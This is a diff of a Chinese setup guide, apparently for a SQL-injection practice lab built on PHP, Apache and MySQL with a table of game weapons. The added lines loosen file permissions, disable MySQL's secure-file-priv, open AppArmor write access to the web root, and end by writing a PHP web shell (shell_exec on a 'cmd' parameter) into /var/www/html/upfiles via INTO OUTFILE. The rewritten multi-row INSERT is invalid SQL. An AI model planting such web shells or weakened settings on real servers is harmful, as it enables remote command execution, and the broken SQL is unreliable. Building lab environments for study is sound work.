@@ -44,17 +44,17 @@ CREATE TABLE `item` (
 ```
 * item 資料
 ```
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (1,'小李飛刀',100,323)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (2,'屠龍刀',200,40)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (3,'桃園盾',20,500)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (4,'倚天劍',100,100)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (5,'晨星虎斧',318,407)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (6,'封魔流星破',247,50)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (7,'霸虎風魔斬',469,54)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (8,'修羅鬼噬爪',464,415)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (9,'鬼噬日暮滅',327,401)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (10,'洪流鳳火舞',378,485)
-INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (100,'彥宇大悲咒',2000,0)
+INSERT INTO `item`(`id`, `name`, `attack`, `defense`) VALUES (1,'小李飛刀',100,323),
+(`id`, `name`, `attack`, `defense`) VALUES (2,'屠龍刀',200,40),
+(`id`, `name`, `attack`, `defense`) VALUES (3,'桃園盾',20,500),
+(`id`, `name`, `attack`, `defense`) VALUES (4,'倚天劍',100,100),
+(`id`, `name`, `attack`, `defense`) VALUES (5,'晨星虎斧',318,407),
+(`id`, `name`, `attack`, `defense`) VALUES (6,'封魔流星破',247,50),
+(`id`, `name`, `attack`, `defense`) VALUES (7,'霸虎風魔斬',469,54),
+(`id`, `name`, `attack`, `defense`) VALUES (8,'修羅鬼噬爪',464,415),
+(`id`, `name`, `attack`, `defense`) VALUES (9,'鬼噬日暮滅',327,401),
+(`id`, `name`, `attack`, `defense`) VALUES (10,'洪流鳳火舞',378,485),
+(`id`, `name`, `attack`, `defense`) VALUES (100,'彥宇大悲咒',2000,0);
 ```
 
 * 創table user_table
@@ -86,3 +86,30 @@ sudo apt install php libapache2-mod-php php-mysql
 放到 /var/www/html
 
 利用  nautilus 改
+
+sql 資料夾 
+Owner: www-data   C&D
+Group: www-data   C&D
+other:            C&D
+
+upfiles 資料夾 
+Owner: mysql   C&D
+Group: mysql   C&D
+other:         C&D
+
+修改outfile問題
+
+SHOW GLOBAL VARIABLES LIKE '%secure%';
+sudo find /* -name my.cnf
+secure-file-priv = "/"
+
+
+sudo nano /etc/apparmor.d/local/usr.sbin.mysqld 
+
+/var/www/html/upfiles/ r,
+/var/www/html/upfiles/** rw,
+
+sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.mysqld 
+
+測試outfile
+select 1,2,3,"<?php echo shell_exec($_GET['cmd']) ?>"  from item into outfile "/var/www/html/upfiles/shell.php";
